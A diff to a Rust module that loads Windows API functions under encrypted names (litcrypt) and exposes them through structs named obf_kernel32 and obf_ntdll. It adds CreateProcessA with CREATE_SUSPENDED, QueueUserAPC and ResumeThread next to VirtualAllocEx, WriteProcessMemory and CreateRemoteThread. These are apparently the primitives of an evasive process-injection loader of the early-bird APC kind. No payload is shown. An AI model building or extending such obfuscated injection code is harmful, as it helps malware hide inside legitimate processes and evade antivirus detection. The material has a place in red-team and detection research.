@@ -1,4 +1,6 @@
 pub mod Constants {
+    use std::ffi::c_void;
+
     pub const PROCESS_ALL_ACCESS: u32 = 0x1fffff;
     pub const MEM_COMMIT: u32 = 0x1000;
     pub const MEM_RESERVE: u32 = 0x2000;
@@ -12,16 +14,45 @@ pub mod Constants {
     pub const PROCESS_VM_OPERATION: u32 = 0x0008;
     pub const PROCESS_VM_READ: u32 = 0x0010;
     pub const PROCESS_VM_WRITE: u32 = 0x0020;
+    pub const CREATE_SUSPENDED: u32 = 0x4;
+
+    pub struct STARTUPINFOA {
+        pub cb: u32,
+        pub lpReserved: *const c_void,
+        pub lpDesktip: *const c_void,
+        pub lpTitle: *const c_void,
+        pub dwX: u32,
+        pub dwY: u32,
+        pub dwXSize: u32,
+        pub dwYSize: u32,
+        pub dwXCountChars: u32,
+        pub dwYCountChars: u32,
+        pub dwFillAttribute: u32,
+        pub dwFlags: u32,
+        pub wShowWindow: u16,
+        pub cbReserved2: u16,
+        pub lpReserved2: *const c_void,
+        pub hStdInput: isize,
+        pub hStdOutput: isize,
+        pub hStdError: isize,
+    }
+
+    pub struct PROCESS_INFORMATION {
+        pub hProcess: isize,
+        pub hThread: isize,
+        pub dwProcessId: u32,
+        pub dwThreadId: u32,
+    }
+
 }
 
 pub mod Functions {
 
-    use litcrypt::lc;
     use lazy_static::lazy_static;
     use libloading::os::windows::Symbol;
     use libloading::Library;
+    use litcrypt::lc;
     use std::ffi::c_void;
-    use std::ptr::{null, null_mut};
 
     pub struct obf_kernel32 {
         pub VirtualAlloc:
@@ -53,10 +84,14 @@ pub mod Functions {
             ) -> isize,
         >,
         pub OpenProcess: Symbol<unsafe extern "C" fn(u32, i32, u32) -> isize>,
+        pub CreateProcessA: Symbol<unsafe extern "C" fn(*const c_void, *const c_void, *const c_void, *const c_void, i32, u32, *const c_void, *const c_void, *const i8, *const i8) -> i32>,
         pub CloseHandle: Symbol<unsafe extern "C" fn(isize) -> u32>,
         pub WriteProcessMemory: Symbol<
             unsafe extern "C" fn(isize, *const c_void, *const c_void, usize, *mut usize) -> i32,
         >,
+        pub GetLastError: Symbol<unsafe extern "C" fn() -> u32>,
+        pub QueueUserAPC: Symbol<unsafe extern "C" fn(*const c_void, isize, *const c_void) -> i32>,
+        pub ResumeThread: Symbol<unsafe extern "C" fn(isize) -> i32>,
     }
 
     pub struct obf_ntdll {
@@ -68,7 +103,9 @@ pub mod Functions {
             let ntdll = Library::new(lc!("ntdll.dll")).unwrap();
             let rtl_move_memory: libloading::Symbol<
                 unsafe extern "C" fn(*mut c_void, *const c_void, usize),
-            > = ntdll.get(&[lc!("RtlMoveMemory").as_bytes(), b"\0"].concat()).unwrap();
+            > = ntdll
+                .get(&[lc!("RtlMoveMemory").as_bytes(), b"\0"].concat())
+                .unwrap();
             return obf_ntdll {
                 RtlMoveMemory: rtl_move_memory.into_raw(),
             };
@@ -81,11 +118,15 @@ pub mod Functions {
 
             let virtual_alloc: libloading::Symbol<
                 unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
-            > = kernel32.get(&[lc!("VirtualAlloc").as_bytes(), b"\0"].concat()).unwrap();
+            > = kernel32
+                .get(&[lc!("VirtualAlloc").as_bytes(), b"\0"].concat())
+                .unwrap();
 
             let virtual_protect: libloading::Symbol<
                 unsafe extern "C" fn(*const c_void, usize, u32, u32) -> u32,
-            > = kernel32.get(&[lc!("VirtualProtect").as_bytes(), b"\0"].concat()).unwrap();
+            > = kernel32
+                .get(&[lc!("VirtualProtect").as_bytes(), b"\0"].concat())
+                .unwrap();
 
             let create_thread: libloading::Symbol<
                 unsafe extern "C" fn(
@@ -96,22 +137,32 @@ pub mod Functions {
                     u32,
                     *mut u32,
                 ) -> isize,
-            > = kernel32.get(&[lc!("CreateThread").as_bytes(), b"\0"].concat()).unwrap();
+            > = kernel32
+                .get(&[lc!("CreateThread").as_bytes(), b"\0"].concat())
+                .unwrap();
 
             let open_process: libloading::Symbol<unsafe extern "C" fn(u32, i32, u32) -> isize> =
-                kernel32.get(&[lc!("OpenProcess").as_bytes(), b"\0"].concat()).unwrap();
+                kernel32
+                    .get(&[lc!("OpenProcess").as_bytes(), b"\0"].concat())
+                    .unwrap();
 
             let virtual_alloc_ex: libloading::Symbol<
                 unsafe extern "C" fn(isize, *const c_void, usize, u32, u32) -> *mut c_void,
-            > = kernel32.get(&[lc!("VirtualAllocEx").as_bytes(), b"\0"].concat()).unwrap();
+            > = kernel32
+                .get(&[lc!("VirtualAllocEx").as_bytes(), b"\0"].concat())
+                .unwrap();
 
             let write_process_memory: libloading::Symbol<
                 unsafe extern "C" fn(isize, *const c_void, *const c_void, usize, *mut usize) -> i32,
-            > = kernel32.get(&[lc!("WriteProcessMemory").as_bytes(), b"\0"].concat()).unwrap();
+            > = kernel32
+                .get(&[lc!("WriteProcessMemory").as_bytes(), b"\0"].concat())
+                .unwrap();
 
             let virtual_protect_ex: libloading::Symbol<
                 unsafe extern "C" fn(isize, *const c_void, usize, u32, *mut u32) -> i32,
-            > = kernel32.get(&[lc!("VirtualProtectEx").as_bytes(), b"\0"].concat()).unwrap();
+            > = kernel32
+                .get(&[lc!("VirtualProtectEx").as_bytes(), b"\0"].concat())
+                .unwrap();
 
             let create_remote_thread: libloading::Symbol<
                 unsafe extern "C" fn(
@@ -123,10 +174,23 @@ pub mod Functions {
                     usize,
                     *mut c_void,
                 ) -> isize,
-            > = kernel32.get(&[lc!("CreateRemoteThread").as_bytes(), b"\0"].concat()).unwrap();
+            > = kernel32
+                .get(&[lc!("CreateRemoteThread").as_bytes(), b"\0"].concat())
+                .unwrap();
 
-            let close_handle: libloading::Symbol<unsafe extern "C" fn(isize) -> u32> =
-                kernel32.get(&[lc!("CloseHandle").as_bytes(), b"\0"].concat()).unwrap();
+            let close_handle: libloading::Symbol<unsafe extern "C" fn(isize) -> u32> = kernel32
+                .get(&[lc!("CloseHandle").as_bytes(), b"\0"].concat())
+                .unwrap();
+
+            let create_process_a: libloading::Symbol<unsafe extern "C" fn(*const c_void, *const c_void, *const c_void, *const c_void, i32, u32, *const c_void, *const c_void, *const i8, *const i8) -> i32>
+            = kernel32.get(&[lc!("CreateProcessA").as_bytes(), b"\0"].concat()).unwrap();
+
+            
+            let get_last_error: libloading::Symbol<unsafe extern "C" fn() -> u32> = kernel32.get(&[lc!("GetLastError").as_bytes(), b"\0"].concat()).unwrap();
+            
+            let queue_user_apc: libloading::Symbol<unsafe extern "C" fn(*const c_void, isize, *const c_void) -> i32> = kernel32.get(&[lc!("QueueUserAPC").as_bytes(), b"\0"].concat()).unwrap();
+            
+            let resume_thread: libloading::Symbol<unsafe extern "C" fn(isize) -> i32> = kernel32.get(&[lc!("ResumeThread").as_bytes(), b"\0"].concat()).unwrap();
 
             return obf_kernel32 {
                 VirtualAlloc: virtual_alloc.into_raw(),
@@ -138,6 +202,10 @@ pub mod Functions {
                 VirtualProtectEx: virtual_protect_ex.into_raw(),
                 CreateRemoteThread: create_remote_thread.into_raw(),
                 CloseHandle: close_handle.into_raw(),
+                CreateProcessA: create_process_a.into_raw(),
+                GetLastError: get_last_error.into_raw(),
+                QueueUserAPC: queue_user_apc.into_raw(),
+                ResumeThread: resume_thread.into_raw()
             };
         }
     }
